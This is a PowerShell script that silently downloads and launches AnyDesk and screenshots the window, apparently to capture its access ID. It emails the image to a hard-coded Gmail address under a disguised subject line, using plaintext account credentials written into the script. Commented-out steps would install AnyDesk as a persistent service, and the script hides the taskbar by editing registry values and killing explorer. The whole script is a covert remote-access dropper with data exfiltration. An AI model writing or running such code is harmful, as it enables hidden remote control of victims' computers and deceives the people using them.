
#Set-ExecutionPolicy -Scope LocalMachine Unrestricted

$WebClient = New-Object System.Net.WebClient
$WebClient.DownloadFile("https://download.anydesk.com/AnyDesk.exe?_ga=2.18057850.278332510.15761269832046888247.1576126983","D:\anydesk.exe")

$maximumRuntimeSeconds = 1
$process = Start-Process -FilePath D:\anydesk.exe -ArgumentList '-Command ' -PassThru
try
{
$process | Wait-Process -Timeout $maximumRuntimeSeconds -ErrorAction Stop
Write-Warning -Message 'Process successfully completed within timeout.'
}
catch
{
Write-Warning -Message 'Process exceeded timeout, will be killed now.'

#screenshot 
$src = @'
using System;
using System.Runtime.InteropServices;

namespace PInvoke
{
public static class NativeMethods 
{
[DllImport("user32.dll")]
[return: MarshalAs(UnmanagedType.Bool)]
public static extern bool GetWindowRect(IntPtr hWnd, out RECT lpRect);
}

[StructLayout(LayoutKind.Sequential)]
public struct RECT
{
public int Left; // x position of upper-left corner
public int Top; // y position of upper-left corner
public int Right; // x position of lower-right corner
public int Bottom; // y position of lower-right corner
}
}
'@

Add-Type -TypeDefinition $src
Add-Type -AssemblyName System.Drawing

# Get a process object from which we will get the main window bounds
$iseProc = Get-Process -id $pid

$bmpScreenCap = $g = $null
try {
$rect = new-object PInvoke.RECT
if ([PInvoke.NativeMethods]::GetWindowRect($iseProc.MainWindowHandle, [ref]$rect))
{
$width = $rect.Right - $rect.Left + 1
$height = $rect.Bottom - $rect.Top + 1
$bmpScreenCap = new-object System.Drawing.Bitmap $width,$height
$g = [System.Drawing.Graphics]::FromImage($bmpScreenCap)
$g.CopyFromScreen($rect.Left, $rect.Top, 0, 0, $bmpScreenCap.Size, 
[System.Drawing.CopyPixelOperation]::SourceCopy)
$bmpScreenCap.Save("D:\screenshot.bmp")
}
}
finally {
if ($bmpScreenCap) { $bmpScreenCap.Dispose() }
if ($g) { $g.Dispose() }
} 
#screenshot

#$process | Stop-Process -Force
}

$file = "D:\screenshot.bmp"
$att = new-object Net.Mail.Attachment($file)

$msg = new-object Net.Mail.MailMessage

$msg.From = "hellobigboss1@gmail.com"

$msg.To.Add("hellobigboss1@gmail.com")

#$msg.To.Add("akhil.rgukt1@gmail.com")

$msg.Subject = "Notification from email server"

$msg.Body = "Attached is the email server mailbox report"

$msg.Attachments.Add($att)

$smtpServer = "smtp.gmail.com"

$smtp = new-object Net.Mail.SmtpClient($smtpServer, 587)

$smtp.EnableSsl = $true

$smtp.Credentials = New-Object System.Net.NetworkCredential(“hellobigboss1@gmail.com”, “tester@123”);

$smtp.Send($msg)

$att.Dispose()

#Copy-Item 'D:/anydesk.exe' 'D:/Windows/anydesk.exe'

#New-Service -Name "ExampleService" -DisplayName "Example Service" -Description "An Example Service" -StartupType Manual -BinaryPathName "D:/Windows/anydesk.exe --service"

#Start-Process -FilePath D:\anydesk.exe -ArgumentList '-Command ' -PassThru

&{$p='HKCU:SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\StuckRects3';$v=(Get-ItemProperty -Path $p).Settings;$v[8]=3;&Set-ItemProperty -Path $p -Name Settings -Value $v;&Stop-Process -f -ProcessName explorer}

&{$p='HKCU:SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\StuckRects2';$v=(Get-ItemProperty -Path $p).Settings;$v[8]=3;&Set-ItemProperty -Path $p -Name Settings -Value $v;&Stop-Process -f -ProcessName explorer}

#Hide Taskbar
